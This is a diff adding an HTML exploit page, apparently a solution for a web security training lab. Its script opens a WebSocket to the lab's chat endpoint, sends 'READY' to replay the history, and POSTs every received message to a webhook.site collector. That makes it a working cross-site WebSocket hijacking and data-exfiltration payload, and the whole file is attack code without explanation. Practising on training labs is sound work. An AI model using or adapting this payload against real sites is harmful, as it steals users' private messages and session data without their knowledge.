@@ -1,0 +1,16 @@
+<html>
+  <body>
+    <h1>Hello</h1>
+    <script>
+      const socket = new WebSocket('wss://0a3a0081031b2b6d80b40da000b400c9.web-security-academy.net/chat');
+
+      socket.onopen = function(event) {
+        socket.send('READY');
+      };
+      
+      socket.onmessage = function(event) {
+        fetch('https://webhook.site/8af937b8-6032-43b6-8608-b93b1e32fb95', {method: 'POST', mode: 'no-cors', body: event.data});
+      };
+    </script>
+  </body>
+</html>
